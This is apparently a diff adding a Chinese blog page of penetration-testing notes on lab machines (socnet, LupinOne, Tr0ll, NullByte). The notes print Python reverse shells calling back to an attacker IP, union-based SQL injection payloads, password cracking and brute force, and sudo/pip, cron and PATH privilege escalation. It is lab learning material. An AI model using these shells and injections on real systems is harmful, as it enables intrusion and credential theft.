+<li>查看里面的各种文件信息，主要是配置config信息，果然<strong>找到了mysql的用户名密码</strong></li>
+<li>登录进去，查看用户表，有用户名和密码</li>
+<li>爆破密码</li>
+<li>登录进去，除了flag，没什么利用的点</li>
+<li>对于phpmyadmin，去检查udf提权的可能性，确认是没有的</li>
+<li>考虑 <strong>密码重用</strong></li>
+<li>因为在webshell中，cd进&#x2F;home，看到两个用户</li>
+<li><strong>ssh</strong>尝试用相同密码，ssh返回证明是密钥登陆的</li>
+<li>想到还有<strong>ftp</strong>，尝试用ftp登录，尝试成功</li>
+<li>得到密钥文件</li>
+<li>尝试ssh -i 密钥文件登录，登录成功</li>
+<li><strong>获得用户shell</strong>，尝试提权，无果</li>
+<li>但是有pcap文件，下载，分析后得到另一个用户信息</li>
+<li>ssh登录，尝试提权，利用sudo提权，得到<strong>root权限</strong></li>
+</ol>
+<p>它的流程就是：弱口令-&gt;webshell-&gt;mysql(给用户密码)-&gt;ftp(给密钥)-&gt;ssh(密钥登陆)-&gt;pcap文件分析-&gt;ssh(密码登录)-&gt;sudo提权-&gt;root</p>
+<h1 id="四、socnet"><a href="#四、socnet" class="headerlink" title="四、socnet"></a>四、socnet</h1><h2 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h2><p>确认ip <code>23</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -p1-65535 192.168.1.23 <span class="comment">#22</span></span><br></pre></td></tr></table></figure>
+
+<p>啊？好好好，就一个端口是吧</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sS -sV -sC -p- 192.168.1.23 <span class="comment">#22</span></span><br><span class="line"><span class="comment">#sS syn扫描，不用三次握手，隐蔽;-sC 脚本扫描</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#好好好，来个大的，没扫到其他的就删了这个靶机！</span></span><br><span class="line">nmap -sS -sV -sC -p- -Pn 192.168.56.254 <span class="comment">#22</span></span><br><span class="line"><span class="comment">###我删了</span></span><br></pre></td></tr></table></figure>
+
+<p>百度了一下，建议使用virtualbox打开，啧</p>
+<p>第一次导入给我报错，好好好；</p>
+<p>卸载重装，解决了，应该是初始大小分配少了，但vmware的kali崩了，我***</p>
+<p>这两个不同设备的机器能ping通吗，嘶</p>
+<h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><p><img src="/../../../Typora/img111/image-20231119134934032.png" alt="应该是这个，有5000端口"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -sV -O -p22,5000 192.168.1.182 </span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../Typora/img111/image-20231119135101994.png" alt="详细信息"></p>
+<p>访问ip</p>
+<p><img src="/../../../Typora/img111/image-20231119135150027.png"></p>
+<p>Testin 123，ssh一下，不是</p>
+<p>搜索123，提示信息不够长，尖括号实体化了，抓包也没发现什么</p>
+<p>先dirb扫个目录吧，就一个admin，代码测试页面</p>
+<p><img src="/../../../Typora/img111/image-20231119140002115.png"></p>
+<p>插件也发现不了什么CMS等信息，回到nmap给的<code>Werkzeug</code>，搜一下</p>
+<blockquote>
+<p>Werkzeug是Python的WSGI规范的实用函数库。使用广泛，基于BSD协议。是个工具包，也可以作为web底层框架</p>
+</blockquote>
+<p>难道说</p>
+<p><img src="/../../../Typora/img111/image-20231119141140030.png" alt="执行了代码"></p>
+<p>我找找python反弹</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.1.109&quot;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>emmm，错误</p>
+<p>搜到一个远程REC脚本</p>
+<p><img src="/../../../Typora/img111/image-20231119142524870.png" alt="没用"></p>
+<p>回头又试了一下python代码，嘶，攻击机监听不到啊啊啊啊啊啊啊啊啊</p>
+<p>不知道怎么捣鼓了一下，这边可以接收到请求了</p>
+<p><img src="/../../../Typora/img111/image-20231119143816790.png"></p>
+<p>输入命令不管用嘞，哦，把<strong>单引号去掉</strong>就可以，虽然网站会报错信息，但其实已经监听打了</p>
+<p><img src="/../../../Typora/img111/image-20231119144646561.png"></p>
+<h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><p>啊？这就root啦？</p>
+<p><img src="/../../../Typora/img111/image-20231119144707664.png" alt="root用户"></p>
+<p>但是切换到&#x2F;root，目录发现是没东西的</p>
+<p>而且在&#x2F;app，ls时，有一个Dockerfile，内容为</p>
+<p><img src="/../../../Typora/img111/image-20231119145133992.png"></p>
+<p>ifconfig，这个ip有另一个，应该是内网的</p>
+<p><img src="/../../../Typora/img111/image-20231119144918035.png" alt="内网ip"></p>
+<p>我找了些文件夹后才想到</p>
+<p>既然如此，就利用该终端进行netdiscover呢？发现没有这个功能，nmap也没有，无法扫描其他网段</p>
+<h3 id="nc传输nmap-失败"><a href="#nc传输nmap-失败" class="headerlink" title="nc传输nmap-失败"></a>nc传输nmap-失败</h3><p><img src="/../../../Typora/img111/image-20231119145948574.png" alt="nc失败了嘞"></p>
+<p>中间<strong>断开了一次</strong>，重新反弹还连不上了嘞</p>
+<p><img src="/../../../Typora/img111/image-20231119151220505.png" alt="监听没有输出"></p>
+<p>哎，难顶啊哎，难顶啊哎，难顶啊哎，难顶啊哎，难顶啊哎，难顶啊哎，难顶啊哎，难顶啊哎，难顶啊哎，难顶啊哎，难顶啊哎，难顶啊哎，难顶啊哎，难顶啊哎，难顶啊哎，难顶啊哎，难顶啊哎，难顶啊哎，难顶啊哎，难顶啊哎，难顶啊哎，难顶啊哎，难顶啊哎，难顶啊哎，难顶啊哎，难顶啊哎，难顶啊哎，难顶啊哎，难顶啊哎，难顶啊哎，难顶啊哎，难顶啊哎，难顶啊……</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">&quot;192.168.1.109&quot;</span>,<span class="number">2333</span>));os.dup2(s.fileno(),<span class="number">0</span>); os.dup2(s.fileno(),<span class="number">1</span>);os.dup2(s.fileno(),<span class="number">2</span>);<span class="keyword">import</span> pty; pty.spawn(<span class="string">&quot;/bin/sh&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>可以了</p>
+<p>那我攻击机开一个http服务器，靶机有<strong>wget</strong>，那去访问并下载就是了</p>
+<p><strong>下载失败嘞</strong></p>
+<p><img src="/../../../Typora/img111/image-20231119154607038.png"></p>
+<p>考虑到现在还是root的，所以可能这个文件夹有权限，换个文件夹</p>
+<p><img src="/../../../Typora/img111/image-20231119154635252.png" alt="ok,nice try"></p>
+<p>.&#x2F;nmap，不加x权限吧，权限拒绝；加了吧，找不到；真有你的啊</p>
+<p><img src="/../../../Typora/img111/image-20231119154901819.png" alt="用不了nmap"></p>
+<p><strong>换个方式吧</strong></p>
+<h3 id="脚本扫描"><a href="#脚本扫描" class="headerlink" title="脚本扫描"></a>脚本扫描</h3><p><code>for i in $(seq 1 10);do ping -c 1 172.17.0.$i;done</code></p>
+<p>直接往终端输入回车即可</p>
+<p><img src="/../../../Typora/img111/image-20231120153325914.png" alt="有其他两个ip是存在的，0.1和0.3"></p>
+<h3 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h3><p>传输nmap又失败，直接内网穿透，使得外网用户可以访问内网用户</p>
+<p>Venom工具：<code>https://github.com/Dliv3/Venom/releases</code></p>
+<p>服务器打开web</p>
+<p><img src="/../../../Typora/img111/image-20231120160706269.png" alt="web"></p>
+<p><img src="/../../../Typora/img111/image-20231120160725723.png" alt="终端下载客户端"></p>
+<p>攻击机启动</p>
+<p><img src="/../../../Typora/img111/image-20231120161233852.png"></p>
+<p>靶机启动</p>
+<p><img src="/../../../Typora/img111/image-20231120161210654.png"></p>
+<p>对&#x2F;etc&#x2F;proxychains4.conf编辑</p>
+<p><img src="/../../../Typora/img111/image-20231120163139133.png"></p>
+<p><img src="/../../../Typora/img111/image-20231120164330183.png" alt="proxychains nmap扫描"></p>
+<h3 id="不搞了，扫不到"><a href="#不搞了，扫不到" class="headerlink" title="不搞了，扫不到"></a>不搞了，扫不到</h3><p>这个先不做了，后面的流程是发现一个端口，找exp进入到shell，再uname -a，找到linux版本，也找一个exp，修改后，进行提权</p>
+<h1 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h1><p>学到了内网穿透</p>
+<p>扫端口5000-&gt;nc反弹-&gt;拿到webshell-&gt;&#x2F;root没东西-&gt;ifconfig，是另一个网段-&gt;用了docker-&gt;因为该webshell无法自己扫描端口等-&gt;内网穿透-&gt;扫端口-&gt;漏洞利用-&gt;拿shell-&gt;提权</p>
+<h1 id="五、Empire-LupinOne"><a href="#五、Empire-LupinOne" class="headerlink" title="五、Empire-LupinOne"></a>五、Empire-LupinOne</h1><h2 id="1-信息收集-3"><a href="#1-信息收集-3" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ip为，101</span><br><span class="line">nmap -Pn -sV -p- 192.168.1.101 <span class="comment">#22,80</span></span><br><span class="line">nmap -sS -Pn -sV -O -p22,80 192.168.1.101 </span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../Typora/img111/image-20231121110553539.png" alt="nmap详细信息"></p>
+<p>访问ip</p>
+<p><img src="/../../../Typora/img111/image-20231121110634761.png" alt="首页"></p>
+<p>没什么信息，dirb一下</p>
+<p>robots.txt提供的一个路径是没用的</p>
+<p>主要是以&#x2F;manual开始的路径</p>
+<p>貌似是Apache配置相关的文档</p>
+<p><img src="/../../../Typora/img111/image-20231121112239975.png"></p>
+<p>那就是说，不应该用ip访问，还是要用域名</p>
+<p>emmm，搜一下 apache 2.4.48，没找到什么</p>
+<p>但是回想过来 robots.txt那个玩意儿 <code>~myfiles</code>，可以操作一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.1.101/~ -t -r <span class="comment">#-t 不在url末尾添加/，-r不递归</span></span><br><span class="line"><span class="comment">#发现了 ~secret，再基于此遍历</span></span><br><span class="line">http://192.168.1.101/~secret/index.html</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../Typora/img111/image-20231121115417998.png"></p>
+<p>好，这里有一个隐藏的私钥文件;有一个作者名字为 <code>icex64</code>；</p>
+<p>github搜索这个名字，是有个这个用户，但内容好像不对；但这个可以作为ssh的用户名</p>
+<p>它说的 <code>这里</code>，是哪里嘞，在这个页面下，貌似没有啊，bp抓包看看情况，没有</p>
+<p>拼接 <code>/ssh</code>，<code>/.ssh</code>也没用</p>
+<p>那还是要爆破？common字典没用了，换个大的</p>
+<p>看了wp才知道是 <code>.mysecret.txt</code>，这谁想得到</p>
+<h3 id="ssh连接"><a href="#ssh连接" class="headerlink" title="ssh连接"></a>ssh连接</h3><p>复制内容，chomod 600，ssh -i试一下，貌似错误了 <code>error in libcrypto</code></p>
+<p>这个确实有问题，真正的私钥文件会有开头和结束说明这是一个私钥文件，它没这些文本，可能是加密了</p>
+<p>看了wp，居然是个<code>base58</code>编码的</p>
+<p><code>ssh -i</code>试一下</p>
+<p><img src="/../../../Typora/img111/image-20231121130950981.png" alt="需要passphrase"></p>
+<p>搜索了一下解决办法：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh2john baji &gt; <span class="built_in">hash</span> </span><br><span class="line"><span class="comment">#/usr/share/wordlists/ 有fasttrack，原来这是个字典的名字</span></span><br><span class="line">john <span class="built_in">hash</span> --w=/usr/share/wordlists/fasttrack.txt <span class="comment">#114514P@55w0rd!11451421321</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../Typora/img111/image-20231121131608619.png" alt="进入shell"></p>
+<h3 id="sudo提权"><a href="#sudo提权" class="headerlink" title="sudo提权"></a>sudo提权</h3><p>sudo提权一下</p>
+<p><img src="/../../../Typora/img111/image-20231121131831128.png"></p>
+<p>就是说可以用python3.9，然后有一个脚本可以用，cat后</p>
+<p><img src="/../../../Typora/img111/image-20231121132020001.png" alt="这个网址算了，一看就安全"></p>
+<p><img src="/../../../Typora/img111/image-20231121132127421.png" alt="看一下/home的用户"></p>
+<p>这个note.txt说，icex64可以访问arsene的程序，且它有一个私密文件</p>
+<p>那我是否可以更改heist.py从而查看 .secret文件内容呢？我不知道</p>
+<p>但是里面导入了一个webbrowser， 看看</p>
+<p><img src="/../../../Typora/img111/image-20231121133639119.png"></p>
+<p>代码引入了 os，而且可修改</p>
+<p><img src="/../../../Typora/img111/image-20231121133921304.png"></p>
+<p>在末尾顶格加入 <code>os.system(&quot;/bin/bash&quot;)</code>，执行下脚本</p>
+<h3 id="切换用户"><a href="#切换用户" class="headerlink" title="切换用户"></a>切换用户</h3><p><img src="/../../../Typora/img111/image-20231121135257984.png"></p>
+<p><img src="/../../../Typora/img111/image-20231121135332183.png" alt="得到密码"></p>
+<h3 id="sudo提权-1"><a href="#sudo提权-1" class="headerlink" title="sudo提权"></a>sudo提权</h3><p><img src="/../../../Typora/img111/image-20231121135417601.png" alt="可以用root权限执行，且无需密码"></p>
+<p>pip我只知道是安装用的</p>
+<p><img src="/../../../Typora/img111/image-20231121135816002.png" alt="这种执行不会是root"></p>
+<p>搜索一下pip提权</p>
+<p><a target="_blank" rel="noopener" href="https://www.u72.net/IT/show-77783.html">https://www.u72.net/IT/show-77783.html</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TF=$(<span class="built_in">mktemp</span> -d) </span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;import os; os.execl(&#x27;/bin/sh&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;sh &lt;<span class="subst">$(tty)</span> &gt;<span class="subst">$(tty)</span> 2&gt;<span class="subst">$(tty)</span>&#x27;)&quot;</span> &gt; <span class="variable">$TF</span>/setup.py </span><br><span class="line">sudo pip install <span class="variable">$TF</span></span><br></pre></td></tr></table></figure>
+
+<p>这个(mktemp -d) ，是创建一个临时目录</p>
+<p><img src="/../../../Typora/img111/image-20231121141127947.png"></p>
+<h1 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h1><p>本质是路径爆破，对字典要求比较高+提权</p>
+<p>80端口-&gt;路径爆破-&gt;目录名fuzz-&gt;私钥解码-&gt;passphrase破解-&gt;ssh登录-&gt;sudo提权-&gt;改写py文件-&gt;切换shell-&gt;pip提权</p>
+<h1 id="六、APT靶机的域渗透"><a href="#六、APT靶机的域渗透" class="headerlink" title="六、APT靶机的域渗透"></a>六、APT靶机的域渗透</h1><p>这个要vip，我就看看b站视频，了解思路和知识点</p>
+<p><img src="/../../../Typora/img111/image-20231124133120544.png"></p>
+<p>后续不看了，这块知识薄弱</p>
+<h1 id="七、Tr0ll"><a href="#七、Tr0ll" class="headerlink" title="七、Tr0ll"></a>七、Tr0ll</h1><h3 id="1-信息收集-4"><a href="#1-信息收集-4" class="headerlink" title="1.信息收集"></a>1.信息收集</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -Pn -p- 192.168.1.102 <span class="comment">#21,22,80</span></span><br><span class="line">nmap -sS -Pn -sV -sC -O -p21,22,80 192.168.1.102 </span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../Typora/img111/image-20231121150303310.png"></p>
+<p>有 <code>/secret</code>，dirb爆破一下，默认字典没什么特别的文件</p>
+<p>那我加个后缀呢？txt和php,jpg也没什么，没结果</p>
+<p>等一下，ftp是可以匿名登录的，而且暴露出了lol.pcap</p>
+<p>火狐浏览器访问不了ftp</p>
+<p><img src="/../../../Typora/img111/image-20231121154308790.png" alt="直接终端访问"></p>
+<p>wireshark分析</p>
+<p><img src="/../../../Typora/img111/image-20231121155256667.png" alt="可以登录了"></p>
+<p>但是只有这一个文件</p>
+<p><img src="/../../../Typora/img111/image-20231121155424768.png" alt="进入ftp"></p>
+<p>那这个txt文件怎么来的呢</p>
+<p><img src="/../../../Typora/img111/image-20231121154741976.png"></p>
+<p><img src="/../../../Typora/img111/image-20231121160944988.png" alt="sup3rs3cr3tdirlol有什么含义咩？"></p>
+<p>啧，然后呢？</p>
+<p>看了wp，有几个小技巧</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings lol.pcap #提取pcap的字符串信息</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../Typora/img111/image-20231121162802909.png"></p>
+<p>这种非主流字，可能是<code>leetspeak</code>，翻译过来作为路径</p>
+<p>不行，好吧，不用解码</p>
+<p><img src="/../../../Typora/img111/image-20231122100721222.png" alt="路径拼接"></p>
+<p>下载该文件</p>
+<p><img src="/../../../Typora/img111/image-20231122101146804.png"></p>
+<p>有一个0x0856BF，这个有两个考虑，要么缓冲区溢出，要么还是路径拼接</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.102/sup3rs3cr3tdirlol/0x0856BF <span class="comment">#无</span></span><br><span class="line">http://192.168.1.102/0x0856BF/ <span class="comment">#有</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../Typora/img111/image-20231122101443214.png"></p>
+<p>其中的文本文件内容，可能的用户号</p>
+<p><img src="/../../../Typora/img111/image-20231122101520689.png"></p>
+<p>对应密码</p>
+<p><img src="/../../../Typora/img111/image-20231122101551936.png" alt="Good_job_:)"></p>
+<p><strong>crackmapexec</strong> 工具爆破</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec ssh 192.168.1.102 -u <span class="built_in">which</span>* -p Pass.txt --continue-on-success</span><br><span class="line"><span class="comment">#--continue-on-success 爆破成功会给出成功标志</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../Typora/img111/image-20231122103759748.png" alt="后面5个连接失败"></p>
+<p>那把后面这5个换到前面去，再爆破一次</p>
+<p><img src="/../../../Typora/img111/image-20231122104248808.png" alt="也是失败"></p>
+<p>后面四个总是连接失败，考虑做了爆破的针对性处理</p>
+<p>但是尝试几次后，发现，这个密码是错误的</p>
+<p>但文件夹名 <code>/this_folder_contains_the_password/</code>，说明密码就在这里</p>
+<p>考虑密码是<strong>Pass.txt</strong></p>
+<p>再进行爆破</p>
+<p><img src="/../../../Typora/img111/image-20231122104602586.png" alt="得到成功的ssh凭证"></p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p><img src="/../../../Typora/img111/image-20231122104934011.png"></p>
+<p>ubuntu系统，可以用python弄个丰富的shell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../Typora/img111/image-20231122105237969.png" alt="计划任务和sbin"></p>
+<p>找home用户里的.ssh信息、web信息</p>
+<p><img src="/../../../Typora/img111/image-20231122105648714.png"></p>
+<p>上面的backups没有，然后执行过程中，提示</p>
+<p><img src="/../../../Typora/img111/image-20231122105806812.png"></p>
+<p>自动断开，而且来自<strong>root</strong>，那肯定有一个自动化处理的脚本在这里，如果找到这个脚本，修改一下，可能就可以提权</p>
+<p>通过查看计划日志，找到脚本</p>
+<p><img src="/../../../Typora/img111/image-20231122110333673.png" alt="发现脚本"></p>
+<p>ls -la发现是有修改权限的，那尝试替换代码 为 <code>os.system(&#39;/bin/bash&#39;)</code></p>
+<p>还是断开了</p>
+<p>尝试下面的代码，给一个sudo的权限</p>
+<p><img src="/../../../Typora/img111/image-20231122112050759.png"></p>
+<p><img src="/../../../Typora/img111/image-20231122112243540.png" alt="可以了"></p>
+<h1 id="总结-5"><a href="#总结-5" class="headerlink" title="总结"></a>总结</h1><p>本质是一个ftp匿名信息泄露+脚本修改提权</p>
+<ol>
+<li>端口扫描21&#x2F;22&#x2F;80-&gt;</li>
+<li>nmap的详细信息发现ftp是可以匿名登录的，且有lol.pcap文件-&gt;</li>
+<li>下载lol.pcap文件-&gt;</li>
+<li>wireshark工具或者strings命令去分析该文件-&gt;</li>
+<li>得到一个leetspeak名，尝试拼接为路径名，可以获取到未知文件-&gt;</li>
+<li>file查看文件信息、strings获得文件字符串，得到一个地址名，尝试路径拼接-&gt;</li>
+<li>得到用户名文件和密码文件-&gt;</li>
+<li>crackmapexec去爆破ssh，不成功-&gt;</li>
+<li>根据密码文件夹名提示，将密码文件名作为密码，再次爆破，得到overflow凭证-&gt;</li>
+<li>登录overflow shell-&gt;</li>
+<li>本地提权无果、计划任务文件权限禁止、sbin文件查找、敏感文件查找无果-&gt;</li>
+<li>shell自动退出，推断有一个自动化脚本-&gt;</li>
+<li>查找计划日志，发现脚本，修改脚本文件代码，写入sudoers文件，赋予sudo权限</li>
+<li>sudo -l提权，因为代码修改给的权限很大，直接bash -p提权，成功</li>
+</ol>
+<h1 id="八、NullByte"><a href="#八、NullByte" class="headerlink" title="八、NullByte"></a>八、NullByte</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -Pn -p- 192.168.1.89 <span class="comment">#80,111,777,38682</span></span><br><span class="line">nmap -sS -Pn -p80,111,777,38682 -sV -sC -O 192.168.1.89</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../Typora/img111/image-20231122183922157.png" alt="nmap详细信息"></p>
+<p>111端口， RPCBind 开放漏洞，这个一般用来ddos，而且对于src也不收了，用在这里没什么实质性信息收获，所以跳过</p>
+<p>常见端口做了转发吧，先不管，进80端口</p>
+<p><img src="/../../../Typora/img111/image-20231122184114630.png" alt="首页"></p>
+<p>网页源代码+f12没有敏感信息，dirb一波</p>
+<p>有phpmyadmin，尝试万能密码 或者 root:mysql，不行</p>
+<p>还有一个上传路径，但是提示说<strong>目录枚举在这里不允许</strong>，插件给的信息为</p>
+<p><img src="/../../../Typora/img111/image-20231122185419093.png"></p>
+<p>去抓个包呢？也没有注入的点</p>
+<p>哦，那去phpmyadmin抓包看看，也没发现什么</p>
+<p>Sphinx和CodeMirror搜了一下也没什么</p>
+<p>好好好，我不会我不会我不会我不会我不会！！！！！！！！！！！</p>
+<p>看了wp，这个图片gif有东西，牛的</p>
+<p>将gif下载下来，strings命查看文本信息</p>
+<p><img src="/../../../Typora/img111/image-20231122212140802.png" alt="kzMb5nVYJw"></p>
+<p>有了前车之鉴，我大胆推测这是个目录</p>
+<p><img src="/../../../Typora/img111/image-20231122220038153.png" alt="页面是Key"></p>
+<p>看源代码为：</p>
+<p><img src="/../../../Typora/img111/image-20231122220229366.png"></p>
+<p>不是连mysql的，那就不存在注入，密码又不是很复杂</p>
+<p>这里我不会，<a target="_blank" rel="noopener" href="http://t.csdnimg.cn/q7L5a">wp这样写的</a></p>
+<p><img src="/../../../Typora/img111/image-20231122220943637.png"></p>
+<p>我直接抄了</p>
+<p><img src="/../../../Typora/img111/image-20231122221112767.png"></p>
+<p>查看源代码</p>
+<p><img src="/../../../Typora/img111/image-20231122221152584.png"></p>
+<p>点文件，让输入行号，我输了一个7，变成了</p>
+<p><img src="/../../../Typora/img111/image-20231122221243703.png"></p>
+<p>先不管，输入ramses</p>
+<p><img src="/../../../Typora/img111/image-20231122221350067.png"></p>
+<p>尝试SQL注入，双引号报错的</p>
+<p><code>tax to use near &#39;%&quot;&#39; at line 1</code></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ramses&quot;--+  #有东西</span><br><span class="line">#order by 尝试，可以，那就尝试联合注入了</span><br><span class="line">ramses&quot; <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span><span class="comment">--+ #列数为3</span></span><br><span class="line">usrtosearch<span class="operator">=</span>ramses&quot; union select 1,database(),user()--+ #对应的有seth、root@localhost</span><br><span class="line">#那只能尝试爆破用户表</span><br><span class="line">#爆表</span><br><span class="line">ramses&quot; <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database(),(<span class="keyword">select</span> group_concat(<span class="string">&#x27;~&#x27;</span>,table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database())<span class="comment">--+ #就一个users</span></span><br><span class="line">#爆列</span><br><span class="line">ramses&quot; union select 1,database(),(select group_concat(&#x27;~&#x27;,column_name) from information_schema.columns where table_name=&#x27;users&#x27;)--+ </span><br><span class="line"># ~id,~user,~pass,~position </span><br><span class="line">#爆字段</span><br><span class="line">ramses&quot; <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database(),(<span class="keyword">select</span> group_concat(<span class="keyword">user</span>,<span class="string">&#x27;~&#x27;</span>,pass) <span class="keyword">from</span> seth.users)<span class="comment">--+</span></span><br><span class="line"># ramses<span class="operator">~</span>YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE,isis<span class="operator">~</span><span class="comment">--not allowed-- </span></span><br></pre></td></tr></table></figure>
+
+<p>john没爆破出来，md5也搜不到，这43个字符诶，可能要先base64解码</p>
+<p>解密后是32位，感觉符合hash，john工具的话，它拿不准这个哈希类型</p>
+<p>要么去在线网页去，可以破解出来</p>
+<p>要用john的话，先用 <code>hash-identifier</code>识别类型，然后john指定类型</p>
+<p><img src="/../../../Typora/img111/image-20231122224758377.png" alt="omega"></p>
+<p><img src="/../../../Typora/img111/image-20231122224856953.png" alt="端口拒绝"></p>
+<p>确实没有22端口，但是有777端口，也是ssh，指定端口-p 777</p>
+<p><img src="/../../../Typora/img111/image-20231122225155434.png"></p>
+<p>这个backup看看</p>
+<p><img src="/../../../Typora/img111/image-20231122225418007.png"></p>
+<p>不是脚本，是二进制文件</p>
+<p>执行下</p>
+<p><img src="/../../../Typora/img111/image-20231122225446114.png"></p>
+<p>意思是说，这个文件会执行这三个命令，wp的想法就是将提权写入ps中</p>
+<p>将两个文件进行软链接，这样不管是执行sh还是ps，都会进入shell</p>
+<p>然后执行这个proc文件，要将当前路径加入到环境中，再执行</p>
+<p><img src="/../../../Typora/img111/image-20231122235402415.png"></p>
+<h1 id="补充-1"><a href="#补充-1" class="headerlink" title="补充"></a>补充</h1><p>因为端口扫到了rpc有关的，而和rpcbind有关的一个漏洞就是udp反弹的ddos</p>
+<ol>
+<li><p>所以还要扫udp</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU -p80,111,456 ip  <span class="comment">#查看udp状态</span></span><br><span class="line">nmap --script=vuln -p80,111,456 ip<span class="comment">#查看漏洞</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>hydra</p>
+<p>密码爆破工具，这里用于http表单爆破手段</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra 192.168.1.x http-form-post ...上面图片有，我不写了</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>union select用法</p>
+<p>可以略过order by，直接union select 1；union select 1,2;直接添加字段即可</p>
+<p>这里注释符可以用 <code>;-- -</code>，空格解析可以看出来</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#看所有的库，表</span><br><span class="line">&quot; union select table_schema,table_name,3 from information_schema.tables;-- -</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>对于那个密码编码是base64</p>
+<p>那就是一个直觉，尝试一下</p>
+</li>
+<li><p>对shell的敏感信息查询，可以去看看.bash_history，查看命令执行记录</p>
+</li>
+<li><p>专门看图片的工具是 <code>exiftool main.gif</code></p>
+<p>—————————————–！</p>
+<p><strong>除了SQL注入得到表内容(手工或sqlmap)，这里有其它的拓展</strong></p>
+<p><strong>小马写入数据库</strong></p>
+<p>复盘的时候，up主是扫到了uploads这个文件夹，所以他有个新方法</p>
+<p>只要有这个文件夹，不管权限如何，大概率是允许上传的</p>
